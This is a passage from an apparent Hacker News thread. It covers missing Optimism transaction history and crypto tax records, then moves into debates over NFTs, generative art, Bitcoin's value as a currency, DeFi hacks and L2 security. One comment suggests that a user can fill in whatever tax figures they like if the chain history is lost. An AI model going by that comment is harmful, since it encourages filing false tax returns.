immutable data.) And, for the final kicker. 4) Optimism maintainers *themselves* didn't even think to locally cache all the transactions they'd need! (As in the one mentioned who only logged a proper subset of taxable events.) If the very people who live and breathe this stuff overlooked it, I think I can be forgiven for overlooking it, as they expect even casual users to join. [A] [https://metamask.zendesk.com/hc/en-us/articles/4403700785691...](https://metamask.zendesk.com/hc/en-us/articles/4403700785691-Using-Optimistic-Ethereum-with-MetaMask) [B] <https://news.ycombinator.com/item?id=16438630> | | --- | --- | --- | | | |  |  | [EGreg](user?id=EGreg) [on Feb 13, 2022](item?id=30323582)   | [root](#30290157) | [parent](#30293263) | [next](#30292579) [–]  You are right. Putting the responsibility on individuals and small organizations is asking for trouble. But instead, capitalist society simply VC-funds a bunch of centralized entities that wind up with the solution, and don't give it to anyone else. Because after the IPO, Wall Street quarterly earnings demand that it extract rents forever, and you can only do that with closed source software. Perhaps Web3 and Web4 will finally fix this situation. Open source protocols that can be monetized with cryptocurrency. Filecoin is a good example. It "just works". It may be slightly more expensive than AWS, but can become as resilient as you want. | | --- | --- | --- | | | |  |  | [kfichter](user?id=kfichter) [on Feb 10, 2022](item?id=30292579)   | [root](#30290157) | [parent](#30290629) | [prev](#30291266) | [next](#30295711) [–]  Heyo, chiming in from the Optimism team here. You should be able to get non-ETH token transfers (ERC20 or ERC721) via the Etherscan CSV export feature. You may have to make a dummy ERC20/ERC721 transaction to get the page to show up. If that isn't working for you, feel free to hit me up on Discord (I think we already have a thread together) and I can help get you whatever data you need. See this random account for an example of exporting ERC20 transactions: [https://optimistic.etherscan.io/address/0x9c1e0c67aa30c063f3...](https://optimistic.etherscan.io/address/0x9c1e0c67aa30c063f341885b12cb81cc94613fc7#tokentxns) | | --- | --- | --- | | | |  |  | [jkhdigital](user?id=jkhdigital) [on Feb 11, 2022](item?id=30295711)   | [root](#30290157) | [parent](#30290629) | [prev](#30292579) | [next](#30291002) [–]  > The crypto tax software, of course, doesn't know what to do with it I’m still trying to calculate proper basis and gains on transactions from 2018… tens of thousands of trades in various complex hedges across 7-8 different exchanges. I just aggregated everything in a single line item on my original return but of course I got audited T\_T | | --- | --- | --- | | | |  |  | [sizzle](user?id=sizzle) [on Feb 13, 2022](item?id=30325860)   | [root](#30290157) | [parent](#30295711) | [next](#30291002) [–]  Were they on dexes or cexes? If centralized, don’t you get Tex reports? If not centralized, how will they ever know the extent of the trades? | | --- | --- | --- | | | |  |  | [leppr](user?id=leppr) [on Feb 10, 2022](item?id=30291002)   | [root](#30290157) | [parent](#30290629) | [prev](#30295711) | [next](#30323553) [–]  If the history is completely gone, your government won't be able to find it either, so you can just fill in whatever you want to explain how balance A became balance B. | | --- | --- | --- | | | |  |  | [AlexCoventry](user?id=AlexCoventry) [on Feb 10, 2022](item?id=30291824)   | [root](#30290157) | [parent](#30291002) | [next](#30323553) [–]  Of course it's not completely gone. Chain analysis companies, which tax authorities consult, will have backup copies. | | --- | --- | --- | | | |  |  | [EGreg](user?id=EGreg) [on Feb 13, 2022](item?id=30323553)   | [root](#30290157) | [parent](#30290629) | [prev](#30291002) | [next](#30292596) [–]  Wait, what do you mean? I can see all ERC20 transactions in our token (and others) from before Nov 2020 | | --- | --- | --- | | | |  |  | [SilasX](user?id=SilasX) [on Feb 13, 2022](item?id=30324322)   | [root](#30290157) | [parent](#30323553) | [next](#30292596) [–]  I'm talking about the record on optimistic.etherscan.io, which they tell you to point to as the definitive blockchain for Optimism. I am looking at my transaction history right now, and it does not show any history from then in the human-readable part of the site. They recently updated it so you can download a CSV with history from before then (but otherwise no interoperability with the interfaces ETH clients expect). You're probably looking at a client's local cache of transactions (which I have as well), which doesn't help, since they have limited info within a transaction, and depend on you going to (you guessed it) the etherscan endpoints to see the rest. | | --- | --- | --- | | | |  |  | [baxtr](user?id=baxtr) [on Feb 10, 2022](item?id=30292596)   | [parent](#30290157) | [prev](#30290629) | [next](#30290427) [–]  Side note: that’s the first flame war free / nuanced thread on crypto that I have seen on HN so far. Thanks for starting it! | | --- | --- | --- | | | |  |  | [kristofferR](user?id=kristofferR) [on Feb 10, 2022](item?id=30292836)   | [root](#30290157) | [parent](#30292596) | [next](#30293555) [–]  The discussion here used to be way more thoughtful, it's only been bad the last year or so. I think the degradation of crypto discourse here was mostly a knee-jerk reaction to NFTs. "NFTs are stupid, so all crypto is stupid, because NFTs are crypto" - that was likely the thought process behind all the toxicity seen here. | | --- | --- | --- | | | |  |  | [rawtxapp](user?id=rawtxapp) [on Feb 10, 2022](item?id=30292931)   | [root](#30290157) | [parent](#30292836) | [next](#30293555) [–]  I would disagree, in my experience HN has been pretty anti-crypto for a long time, starting with Bitcoin's announcement thread [1]. Personally, I think people are just tired, as a proponent I'm tired of arguing the same stuff over and over again, I can imagine the other side of that too. At this point, time will decide who's right and wrong, I think that what anyone of us thinks doesn't really matter in the grand scheme of things. 1: <https://news.ycombinator.com/item?id=599852> | | --- | --- | --- | | | |  |  | [simias](user?id=simias) [on Feb 10, 2022](item?id=30293308)   | [root](#30290157) | [parent](#30292931) | [next](#30299082) [–]  Yeah I'm an opponent and I feel the same. The talking points have been exhausted half a decade ago. On top of that as cryptocurrencies get more and more mainstream we have to deal with less sophisticated people who make it very hard to have a decent discussion in the first place, because you basically have to start by taking 20 minutes to explain to them what the basics even are. NFTs are really pushing this situation to the extreme. Between the NFT enthusiast who seem to think the technology is literal magic who can do anything you want it to and "haters" who will say stuff like "NFTs are just URLs of JPEG" which is absurd oversimplification and completely misses the point. That being said I would argue that the fact that the discussion is not advancing and that we're left with "monkey jpegs" is to be blamed entirely on the cryptopeople who clearly fail entirely to deliver anything new. The killer "crypto app" has been a couple of years away since 2015 at least. The tech keeps getting more complicated as an attempt to address the fundamentals shortcomings of the blockchain, but it still fails entirely at being anything more than a vehicle for wild speculation. The fundamental reality is that basically nobody would be using any of this if they didn't think it was going to make them rich. That was true five years ago, it's true now and I think it's going to remain true for the foreseeable future. | | --- | --- | --- | | | |  |  | [iskander](user?id=iskander) [on Feb 10, 2022](item?id=30293449)   | [root](#30290157) | [parent](#30293308) | [next](#30295974) [–]  I'll try to engage without pulling us into familiar debates. I have found, in a year of intensive use and research around the Ethereum ecosystem, here are a few things I like that wouldn't really work without an underlying immutable distributed ledger: 1) Creating limited editions of generative art. 2) "Forever" art like on-chain pixel and ASCII art. 3) Frankenstein-like adaptations of traditional fintech constructs into a decentralized implementation, such as AMMs. Also, the more I learn about the zk-rollup space (STARKs and SNARKs) the more curious I get about the possibilities there. You can, for example, have digital treasure hunts where whoever finds the treasure can generate a proof without revealing the location. So far this is just cool without having an obvious killer app, but more than anything else in the crypto space I think there will be killer apps emerging from this technology. By volume, I agree with critics that it's mostly bubble-chasing, gambling, and scams. It might be healthier for everyone if the tech & art experimentation were walled off from investments. At the very least, we probably shouldn't have crypto exchanges advertising -- really nothing interesting comes from luring Main Street to buy and store Doge on a centralized exchange. | | --- | --- | --- | | | |  |  | [8note](user?id=8note) [on Feb 11, 2022](item?id=30297156)   | [root](#30290157) | [parent](#30293449) | [next](#30294077) [–]  I don't know what the third one entails, or whether a distributed ledger actually enables it without also having a centralized legal entity, but the other two seem like they already exist without a distributed ledger. The limited edition art is really just tracking receipts - you can do that over email if you want and it really doesn't have to be public. Non digital art does fine with private receipt tracking. You can also have a dedicated database that charges art owners a maintenance fee, and tracks who the current owner of each art piece. Basically free tier AWS. For 2) forever art already existed without any ledger. People store copies of pictures they like because they feel like it. Not being on a ledger doesn't mean Nyan cat will disappear. The ledger might attempt to guarantee that unpopular works stay available, but I don't think you can guarantee that any particular ledger will continue to be active "forever". They could do a hard fork that prunes out the unpopular art to save on space, and migrate everyone to that one, leaving the old one unhosted. Long term, you're not going to force people to keep spending resources to maintain stuff that nobody cares about | | --- | --- | --- | | | |  |  | [iskander](user?id=iskander) [on Feb 11, 2022](item?id=30302945)   | [root](#30290157) | [parent](#30297156) | [next](#30294077) [–]  >The limited edition art is really just tracking receipts - you can do that over email if you want and it really doesn't have to be public. Non digital art does fine with private receipt tracking. You can also have a dedicated database that charges art owners a maintenance fee, and tracks who the current owner of each art piece. Basically free tier AWS. I think this is a misunderstanding of what happens when a collection is created through a platform like Art Blocks. The generative code is frozen on chain, every minted image has a verifiably random initial seed, and each image is generated from the composition of these two elements. The number of random seeds which can occupy an "official" slot is preconfigured and cannot be later increased. I promise you that this has significant impact on the feeling of working on generative art and what you think of as the final outcome of an art project. It cannot be replicated through some kind of ad-hoc receipt system that lacks algorithmic guarantees and is subject to modification or increase at any later point. | | --- | --- | --- | | | |  |  | [simias](user?id=simias) [on Feb 10, 2022](item?id=30294077)   | [root](#30290157) | [parent](#30293449) | [prev](#30297156) | [next](#30295974) [–]  >1) Creating limited editions of generative art. I personally think that it's not really an interesting feature. Creating scarcity out of something that ought not to be scarce is just a way to infiltrate capitalism in every aspect of our lives. Hacker culture historically went completely against that (phreaking, breaking DRM etc...) but I concede that it's more of a philosophical/political argument than a technical one. I still find it utterly depressing. I would also argue that there's usually a significant difference between ownership of a token on the blockchain and what the local IP laws says. IP law is messy and sometimes subjective, putting things on a blockchain can make things messier rather than simpler. >2) "Forever" art like on-chain pixel and ASCII art. So that one is interesting, but I would argue that it's only true if you consider that the blockchain is "forever". In order for that to be true it means that you have to believe that your blockchain of choice will be considered significant enough by a number of people across... well eternity really. This *could* be true for the "big" ones like Bitcoin and Ethereum, although I'd say the scene is way too young to be sure of that. It's as good a bet as any I suppose. But here's the thing. We already have "forever" digital "art": the source code of the Linux kernel. There are countless copies of it across the globe, and it'll remain archived for the foreseeable future. My point here is that if something is significant enough it won't be difficult to convince a bunch of people across time and space to archive it. People do that for old videogames, music albums, usenet posts etc... And unlike the blockchain you can actually curate it, you don't have to archive the neighbor's sandwich picture collection. I'd argue that this curation power is a feature, and the fact that the blockchain just stores everything forever is a bug. It actually means that the bigger the blockchain grows, the less likely it is that people will want to store personal backups of it. So I don't think the blockchain does anything novel here, and I don't think it does it better. Forcing arbitrary people to store arbitrary data forever regardless of value or interest is just wasteful. >3) Frankenstein-like adaptations of traditional fintech constructs into a decentralized implementation, such as AMMs. I think the oracle problem is really going to make "DeFi" a tough sell. There is, in fact, a lot of trust in our financial system, and being able to use a central authority (the justice system) to settle issues makes things a whole lot simpler and efficient. In general I firmly believe that trust is usually a good thing that makes systems more efficient and this obstination of cryptopeople to get rid of it is more based on political ideology than pragmatism. Trust, but verify. But trust. | | --- | --- | --- | | | |  |  | [scyclow](user?id=scyclow) [on Feb 11, 2022](item?id=30295758)   | [root](#30290157) | [parent](#30294077) | [next](#30303200) [–]  With respect to point 1, I'm sympathetic to your response, but I don't see things quite as bleakly for a few reasons: - NFTs create a scarcity of ownership, but they don't create a scarcity of enjoyment or experience. In fact, the entire NFT generative art community is based around the idea of viewing and enjoying pieces that you don't personally own. - I don't think scarcity of ownership is necessarily a bad thing. Having put some skin in the game for that specific piece, the owner sort of becomes that piece's biggest advocate. And this allows many collectors to form a much stronger relationship to the piece than they would have if they saved a copy of an image they found on instagram. - A generative algorithm can theoretically produce an infinite number of outputs, and I think there are valid artistic reasons to want to limit the set to a specific size. For example, maybe the algorithm no longer produces unique results after 500 or so iterations, and the artist wants to cap the collection at that size to allow people to become familiar with that amount of outputs. Managing this with NFTs allows the artist to create a canonical collection limited to the desired size along with the proof that they all derive from the same algorithm. - Blockchains are still fairly new as an artistic medium, and I think many artists will find ways to create interesting projects without leaning as much on scarcity. Some projects do open editions, which we may see more of in the future. Scarcity is simply a tool at the artist's disposal. (Disclaimer: I'm an artist who makes a lot of generative NFTs, so I'm heavily biased) | | --- | --- | --- | | | |  |  | [8note](user?id=8note) [on Feb 11, 2022](item?id=30297262)   | [root](#30290157) | [parent](#30295758) | [next](#30303200) [–]  if youre not extracting a profit from people enjoying the art, why are you advocating for it? what is your skin in the game? if youre only advocating it to get rid of it by selling it, i dont think thats a genuine advocacy for the piece. im unclear that this scarcity is different from making a wordpress site with n posts, each one being a picture generated with the different parameters. i think the website version is better, even, since you as the artist can pick out the best individual items when producing the single art work that is "n pieces generated by this algorithm" i dont think it really unlocks anything new. Whats different is having tooling that makes it easy to do | | --- | --- | --- | | | |  |  | [scyclow](user?id=scyclow) [on Feb 11, 2022](item?id=30302162)   | [root](#30290157) | [parent](#30297262) | [next](#30303267) [–]  Again, I think the act of "owning" it creates a much different relationship between the collector and that art than simply looking at it. They have skin in the game because they either spent money on the piece, or were able to mint it by being in the right place at the right time. To be sure, a lot of the "advocacy" is exactly what you describe, where people are just trying to push their bags. But the advocacy I'm talking about is more about the social element of discussing the art with other people in the community. The website is certainly a valid way to display a limited generative art collection, but it's a different experience. It means that the artist \_can\_ curate the collection and hide some of the rough edges of the algorithm... but then it loses some of its magic. NFTs have sort of enabled a new sub genre of generative art [1]. [1] [https://tylerxhobbs.com/essays/2021/the-rise-of-long-form-ge...](https://tylerxhobbs.com/essays/2021/the-rise-of-long-form-generative-art) | | --- | --- | --- | | | |  |  | [iskander](user?id=iskander) [on Feb 11, 2022](item?id=30303267)   | [root](#30290157) | [parent](#30297262) | [prev](#30302162) | [next](#30303200) [–]  > if youre not extracting a profit from people enjoying the art, why are you advocating for it? what is your skin in the game? if youre only advocating it to get rid of it by selling it, i dont think thats a genuine advocacy for the piece. There's an emotional state associated with having paid money, sometimes a lot of money, for something which makes you want to get *something* in return. That something can be as simple as collective discussion of the art you bought, or propagation of its image into the real world through murals and commissioned derivatives. It doesn't have to be a speculative interest in re-selling, though I agree that most people entering the space are exclusively interested in the latter. | | --- | --- | --- | | | |  |  | [iskander](user?id=iskander) [on Feb 11, 2022](item?id=30303200)   | [root](#30290157) | [parent](#30294077) | [prev](#30295758) | [next](#30296914) [–]  Re: #3, there isn't really a meaningful oracle problem now that there are reliable oracles. You can make synthetic assets which track prices of e.g. stocks. There are a few different protocols in this space, such as <https://synthetix.io/>. The biggest hurdle, I think, is regulatory -- is it legal to make and trade derivatives of $synthIBM and trade it like derivatives of $IBM? | | --- | --- | --- | | | |  |  | [iskander](user?id=iskander) [on Feb 11, 2022](item?id=30296914)   | [root](#30290157) | [parent](#30294077) | [prev](#30303200) | [next](#30295974) [–]  Re: limited editions, I'm not talking about monetization. As someone currently working on a big generative art collaboration, I think knowing that the output will have a finite set that is considered canonical is an essential artistic constraint. | | --- | --- | --- | | | |  |  | [fleddr](user?id=fleddr) [on Feb 11, 2022](item?id=30295974)   | [root](#30290157) | [parent](#30293308) | [prev](#30293449) | [next](#30299082) [–]  I would consider myself an informed skeptic that is selectively pro-crypto. I would first clear the air by saying this: yes, making money is an important use case of the current crypto industry, if not THE use case. I find it puzzling how people frown upon that. Making money (or at least getting paid) is the number one activity the average person spends a lifetime doing. Many in bullshit jobs that add no value. You can have all kinds of opinions on how this money is made (speculative), but the crypto community doesn't care. It's their money, not yours. I would personally not touch 95% of crypto with my money, but take no issue with people that go all-in. Live and let live. As for NFTs, it's funny how you say some discussion participants simplify it too much (just right-click) and then come to sweeping simplistic conclusions yourself: bored apes and crypto people failing to deliver anything new. This suggests you're keeping track. If so, can you tell me about recent trading volume? The top 10 projects? Which celebrities, artists, musicians and sport teams released popular ones? On which platform? Which are hot upcoming releases? Out of the many issues with NFTs (no infinite storage, copyright acknowledgement, mint duping, etc), which teams are working to address these issues, and what are the solutions? Do you know which non-JPEG NFTs got traction, like unique physical access and lifelong memberships? Which gaming companies are experimenting with NFTs, and I'm talking AAA titles? I could make that list a whole lot longer. I suspect you don't know the answers, but that's not a personal attack. The point is that the space is vast and extremely fast. This idea that nothing has happened in crypto in 10 years is because you're not looking. The discussion is not advancing because people don't spent a second learning about crypto or keeping track. | | --- | --- | --- | | | |  |  | [8note](user?id=8note) [on Feb 11, 2022](item?id=30298124)   | [root](#30290157) | [parent](#30295974) | [next](#30299082) [–]  All an NFT is at heart a JSON blob like { Id: some unique namespaced string (aka, the part that is a non fungible token) Owner: reference to who currently owns it Payload: data that defines the content of the NFT } You can put this in a database if you want, or use a block chain as your data storage. I expect many of those teams you mentioned are solving their NFT issues by moving their NFTs from block chains onto postgres tables, or putting them in databases from the start. The listed problems have somewhat straightforward solutions by doing so, and many companies have offered NFT marketplaces based on databases for years and years like the Steam marketplace for gaming. They work fine at scale, too. I expect that most popular digital ownership systems do not use a block chain as their back end, though I do not know what the top 10 are {apple, amazon, google, the us government?}. The most advanced team solving the listed problems is without doubt YouTube though. What block chain NFTs have over database NFTs is hype. There's a lot of wealthy people with money tied up in crypto investments that want to be able to. The other feature is that the audit history of changes to the Owner field is guaranteed to be public instead of optionally public, and that guarantee is what of questionable value when "crypto people don't deliver anything new" is mentioned. ---- If somebody's managed to make solve identity using a block chain that's quite interesting re: "unique physical access". I'd expect the block chain to be uniquely incapable of guaranteeing unique access to anything, since access is based on knowing a password, and it's easy to make copies of a password. At best id expect a blockchain to guarantee limited access to people who know one at least one of a set of possible passwords, and a bouncer controls unique access by doing a separate identity checks. Is this some facial scan? Dna +epigenetics check? Is it trivial to link all your accounts together? What kinds of attacks has it been tested against? Can your twin get in if he knows the right password and borrows your id? Can your spouse get in if you're in the hospital? Next of kin when you die? | | --- | --- | --- | | | |  |  | [iskander](user?id=iskander) [on Feb 11, 2022](item?id=30303238)   | [root](#30290157) | [parent](#30298124) | [next](#30299082) [–]  Is there a non-blockchain equivalent of gated access to resources based on ownership of a token? People do this a lot in the NFT space (access to certain chat channels based on owning an NFT), is anything like that happening (rather than theoretically possible) outside of crypto? | | --- | --- | --- | | | |  |  | [mmerlin](user?id=mmerlin) [on Feb 11, 2022](item?id=30307875)   | [root](#30290157) | [parent](#30303238) | [next](#30299082) [–]  How about anything with a membership fee? The token is the mag-key-card that opens the doors to your local gymnasium. Or a database entry that gets checked when you show your personal ID to get into the flight club lounge you bought lifetime access to via Amex club Or any kind of website or info-product you bought a membership for, where the token is your email address + password etc. | | --- | --- | --- | | | |  |  | [iskander](user?id=iskander) [on Feb 12, 2022](item?id=30310310)   | [root](#30290157) | [parent](#30307875) | [next](#30299082) [–]  These all seem different though. None function with anonymity by default and you can't sell or even transfer most of these memberships. I wonder if part of the divide on the "utility" of NFTs involves "internet native" culture (assuming the reality of pseudonyms without need to pierce the veil and use a real name). | | --- | --- | --- | | | |  |  | [lhl](user?id=lhl) [on Feb 11, 2022](item?id=30299082)   | [root](#30290157) | [parent](#30292931) | [prev](#30293308) | [next](#30293369) [–]  Over the past few years, my personal experience/perception is there's been less and less people with a technical grounding in crypto/blockchain who bother to engage on HN (on CT, it's often dismissively referenced as "the orange site") because not only is there such a strong anti-crypto attitude, but usually it's based on pretty shallow or often wrong comprehension of the tech/mechanisms. I agree that it's pretty pointless to argue though. Even when blatant misinformation gets cleared up, or clear examples of how the tech is actually being used are outlined, most of the conversations then end up at "well, *I* don't see the value of it so it still must be useless." ¯\\_(ツ)\_/¯ | | --- | --- | --- | | | |  |  | [BoorishBears](user?id=BoorishBears) [on Feb 10, 2022](item?id=30293369)   | [root](#30290157) | [parent](#30292931) | [prev](#30299082) | [next](#30293555) [–]  Hasn't time already proven the skeptics right? The biggest sources of skeptism were around logistics and value as a currency: Is there a cryptocoin that has successfully solved logistics without disastrously failing as a currency? Even if you ignore the environmental aspect... has any coin that has achieved scale *not* experienced deflation that would make the Great Depression look like a hiccup? To me the skepticism has always been "you can't have a functional decentralized currency". Some people take that at face value and proudly proclaim "people will accept your BTC/ETH/etc." But most people mean it in the sense we think of currencies belonging to non-failed states: aka being a somewhat stable store of value. More widely used for payment of productive economic output than fraud and speculation... - I see crypto as I see Tesla, maybe there way a point but it's long buried under the mania. Disclaimer: Due to that mania I keep some as hedge, but again, imagine saying I keep dollars under my pillow as a hedge that next year they might have 10x'd in value... | | --- | --- | --- | | | |  |  | [rawtxapp](user?id=rawtxapp) [on Feb 10, 2022](item?id=30293507)   | [root](#30290157) | [parent](#30293369) | [next](#30293555) [–]  Has it? Bitcoin is *bigger* than ever before. It's far more valuable, it has far more users, processes hundreds of thousands of transactions moving billions of dollars worth of value every day on-chain alone, has very healthy L2 layer growth (1ml.com), has hundreds of exchanges worldwide, it ticks every 10 minutes and will keep ticking for the foreseeable future. We have a small country that adopted it as a legal tender with more countries coming on the Bitcoin standard potentially this year. People only see the fiat currencies and forget that we've run on gold standard for thousands of years and fiat currencies are barely 50 years old and riddled with financial crises left and right. Bitcoin is digital gold, strictly better than gold. But anyways, we'll see what happens in the future. | | --- | --- | --- | | | |  |  | [8note](user?id=8note) [on Feb 11, 2022](item?id=30298136)   | [root](#30290157) | [parent](#30293507) | [next](#30295063) [–]  Strictly better than gold is not true. Gold can be traded without leaving an audit trail, and without a per transaction cost. | | --- | --- | --- | | | |  |  | [mhmmmmmm](user?id=mhmmmmmm) [on Feb 11, 2022](item?id=30298393)   | [root](#30290157) | [parent](#30298136) | [next](#30295063) [–]  You still have transaction costs in the form of transport costs to get the gold to your personal location. | | --- | --- | --- | | | |  |  | [rawtxapp](user?id=rawtxapp) [on Feb 11, 2022](item?id=30300561)   | [root](#30290157) | [parent](#30298393) | [next](#30295063) [–]  Yep, and obviously any kind of transportation like that will be tracked and easily traced, with exact weights and sizes. By hopping on the lightning network, you're essentially anonymizing your payments as well as making them practically free. | | --- | --- | --- | | | |  |  | [BoorishBears](user?id=BoorishBears) [on Feb 11, 2022](item?id=30295063)   | [root](#30290157) | [parent](#30293507) | [prev](#30298136) | [next](#30293555) [–]  Does that answer anything I brought up? You know, the whole "relatively stable store of value paying for productive output rather than speculation and fraud?" We moved off the gold standard for a reason (and it's not *all* geopolitics...) | | --- | --- | --- | | | |  |  | [miracle2k](user?id=miracle2k) [on Feb 11, 2022](item?id=30295858)   | [root](#30290157) | [parent](#30295063) | [next](#30293555) [–]  Bitcoin's volatility is not because of the fixed supply. If nothing else, new Bitcoins are still being issued. It is of course true that inflation encourages spending etc., but the difference between -2% and 2% does not cause 50% daily price movements. Bitcoin cannot be stable relative to other currencies as long as 90% of its forex volume is speculation. If there are businesses having long-term obligations and trade denominated in Bitcoin, providing for a large base of regular demand and supply that outweighs the speculation, it will stabilise. This is obviously really really though to achieve, but it has absolutely nothing to do with the "tech" (which is essentially a spreadsheet). This makes the debate around the volatility and whether its qualifies as a "currency" rather boring. It will happen, or it won't, and we can try to predict the future, but it is not really about Bitcoin at all, just marketplace behavior. | | --- | --- | --- | | | |  |  | [BoorishBears](user?id=BoorishBears) [on Feb 11, 2022](item?id=30302948)   | [root](#30290157) | [parent](#30295858) | [next](#30293555) [–]  Where did I say Bitcoin's volatility is because of fixed supply. Or even remotely imply it. - Once again the reply doesn't actually answer the basic question, because the answer is inconvenient. I'd love one honest reply to the point grounded in any crypto, not even Bitcoin, being a "relatively stable store of value paying for productive output rather than speculation and fraud?" Relatively stable being defined extremely generously in this context might I add! I won't hit you with a "gotcha!" because your coin of choice is widely used to pay for goods rather than fraud and speculation but it happened to fluctuate 10% or something, USD does that too... | | --- | --- | --- | | | |  |  | [iskander](user?id=iskander) [on Feb 10, 2022](item?id=30293555)   | [root](#30290157) | [parent](#30292596) | [prev](#30292836) | [next](#30290427) [–]  No problem! After a year of playing around with crypto I think I'm appropriately both skeptical and excited, which is hopefully a good starting point for non-trolling conversations. | | --- | --- | --- | | | |  |  | [gillesjacobs](user?id=gillesjacobs) [on Feb 10, 2022](item?id=30290427)   | [parent](#30290157) | [prev](#30292596) | [next](#30292119) [–]  That's an issue with all cryptocurrency infrastructure though: projects need to be proven to demonstrate robust value and it's probably one of the most adversarial spaces in software. History has shown that hacks and exploits of projects hurt the price of the native taken but do not really damage the long-term earned trust. | | --- | --- | --- | | | |  |  | [rawtxapp](user?id=rawtxapp) [on Feb 10, 2022](item?id=30292261)   | [root](#30290157) | [parent](#30290427) | [next](#30292119) [–]  Exactly this, it's a *very* adversarial environment with huge stakes for those that can exploit it. Even projects that have been around for months, years can get exploited which is why I'd recommend waiting a long time before putting non-trivial amounts into any smart contract or crypto related projects. That's also a big plus for Bitcoin, because it's been around the longest and because it's so much simpler than more complex chains like eth, it's as secure as it gets. | | --- | --- | --- | | | |  |  | [jkhdigital](user?id=jkhdigital) [on Feb 11, 2022](item?id=30295560)   | [root](#30290157) | [parent](#30292261) | [next](#30293163) [–]  > That's also a big plus for Bitcoin, because it's been around the longest and because it's so much simpler than more complex chains I’ve always understood this on a basic level, but reading an entire exploit debrief with intricate technical details really hammered this point home for me. | | --- | --- | --- | | | |  |  | [8note](user?id=8note) [on Feb 11, 2022](item?id=30298159)   | [root](#30290157) | [parent](#30295560) | [next](#30293163) [–]  A simple exploit is that somebody got ahold of a wealthy person's private key, isn't it? | | --- | --- | --- | | | |  |  | [dan-robertson](user?id=dan-robertson) [on Feb 10, 2022](item?id=30293163)   | [root](#30290157) | [parent](#30292261) | [prev](#30295560) | [next](#30292119) [–]  Are the stakes that huge for potential exploiters? It seems that exploits can write off a bunch of value from the exploited but, at least for big and quickly noticed exploits, it is hard to launder the gains into the ‘legitimate’ part of the ecosystem with big exchanges and suchlike. | | --- | --- | --- | | | |  |  | [rawtxapp](user?id=rawtxapp) [on Feb 10, 2022](item?id=30293245)   | [root](#30290157) | [parent](#30293163) | [next](#30292119) [–]  I think last year alone had more than a billion dollars worth of crypto hacked on defi, there's some trackers out there [1]. On one hand, you have amateurs that leave their private keys on cloud services and try to cash out while living in a place like NYC, on the other hand, you have people who know what they are doing or perhaps live in places that actively encourage those activities [2]. 1: <https://cryptosec.info/defi-hacks/> 2: <https://www.bbc.com/news/business-59990477> | | --- | --- | --- | | | |  |  | [teempai](user?id=teempai) [on Feb 10, 2022](item?id=30292119)   | [parent](#30290157) | [prev](#30290427) | [next](#30292100) [–]  Ethereum actually has almost no client diversity. The vast majority of nodes run the geth client (go). Regarding the security aspects of L2s: they will of course not be anywhere near as robust as ethereum itself, but over time they’ll get better. However, they also don’t need to be as robust as ethereum given they effectively benchmark against the ethereum chain so while things could go wrong, the amount of damage will be very contained and as the ethereum mainchain scales the damage radius becomes ever more contained. Finally the bridges that are being implemented to move assets from ethereum to the L2s can implement emergency withdrawal mechanisms which allow users to get their assets out even if things go wrong. Not perfect, but the tradeoff seems reasonable to me given the performance enhancement and the diversity of functionality that can be offered via many different environments. Disclaimer: I’m quite possibly biased due to my company working on L2s. | | --- | --- | --- | | | |  |  | [kristofferR](user?id=kristofferR) [on Feb 10, 2022](item?id=30292990)   | [root](#30290157) | [parent](#30292119) | [next](#30292495) [–]  > Ethereum actually has almost no client diversity. I think that is slightly misleading, all the client diversity efforts is focused on Ethereum 2.0 now, as the old clients will be dead soon. [1] This is the most updated stat I've found: <https://twitter.com/sproulM_/status/1481109509544513539> (read the rest of the twitter thread too!) Still not great though, but better at least. [1] <https://clientdiversity.org/> | | --- | --- | --- | | | |  |  | [sophrocyne](user?id=sophrocyne) [on Feb 10, 2022](item?id=30292495)   | [root](#30290157) | [parent](#30292119) | [prev](#30292990) | [next](#30292100) [–]  For those interested in data supporting diversity comment (~82% geth) - <https://www.ethernodes.org/> Re: GP comment - From a "trust" perspective, there is a distinct difference to call out between the integrity of data on the platform, and the trustworthiness of the platform itself (i.e., the ability for centralized control of all data) In an instance where an L2 is compromised, the potential impact is limited to the integrity of data that *individual* L2 was contributing to the overall platform. Those transactions which demand absolute integrity will naturally tend to occur on L1, for this reason. Risk mitigation strategies will develop for those operating on L2 + bridged chains. | | --- | --- | --- | | | |  |  | [iskander](user?id=iskander) [on Feb 10, 2022](item?id=30293340)   | [root](#30290157) | [parent](#30292495) | [next](#30292531) [–]  >In an instance where an L2 is compromised, the potential impact is limited to the integrity of data that individual L2 was contributing to the overall platform. I think distinction is only meaningful as long as L2s remain a niche curiosity while the majority of transaction volume resides on L1. If the L2 plan succeeds and almost all volume passes through an L2 and one of the major L2s has a bug like in this post, then a large fraction of all ETH could end in the hands of hackers. The ledger would accurately reflect the moment that a bad actor lifted e.g. 5-10% of the ETH supply off an Arbitrum or StarkNet bridge. Technically the L1 is uncompromised but a lot of money would be "redistributed". | | --- | --- | --- | | | |  |  | [sophrocyne](user?id=sophrocyne) [on Feb 11, 2022](item?id=30300542)   | [root](#30290157) | [parent](#30293340) | [next](#30292531) [–]  Certainly a possibility, but this is one reason I’d be inclined to believe there will be some significant demand for direct L1 transactions, and a diverse set of L2 layers. | | --- | --- | --- | | | |  |  | [iskander](user?id=iskander) [on Feb 12, 2022](item?id=30310315)   | [root](#30290157) | [parent](#30300542) | [next](#30292531) [–]  Diverse L2 layers sounds like hell. Where's your ETH? Evenly sprinkled between StarkNet, zkSync, Arbitrum, and the thirty competitors that will pop up in the next few years. | | --- | --- | --- | | | |  |  | [sophrocyne](user?id=sophrocyne) [on Feb 12, 2022](item?id=30312910)   | [root](#30290157) | [parent](#30310315) | [next](#30292531) [–]  Are you envisioning homogenous L2s, or those more specialized in nature? I envision the latter, which would mean the number that any individual entity is exposed to would be limited. But your point does highlight the UX implications of too much fragmentation, and it’s a worthwhile consideration | | --- | --- | --- | | | |  |  | [jrochkind1](user?id=jrochkind1) [on Feb 10, 2022](item?id=30292531)   | [root](#30290157) | [parent](#30292495) | [prev](#30293340) | [next](#30298908) [–]  What kinds of transactions do not demand absolute integrity, but still make sense to use a blockchain for? (I don't know much about these sorts of things, I'm actually asking for examples) | | --- | --- | --- | | | |  |  | [mattdesl](user?id=mattdesl) [on Feb 10, 2022](item?id=30293090)   | [root](#30290157) | [parent](#30292531) | [next](#30293697) [–]  Security of zk rollups may be sufficient for a lot of activity - trading, DeFi, games, art, DAO/access tokens, escrow, crowdfunds, all the web3 stuff. The L1 may eventually be a primary settlement layer for protocols like zkSync and StarkNet (and any other protocols and rollups built on Ethereum L1). At some point it may not be common for users to interact with L1—ie. users of Argent and Sequence wallets may only be holding assets on L2. zkSTARK/SNARKs has pretty dramatically changed the L2 landscape and new direction seems to be moving away from optimistic 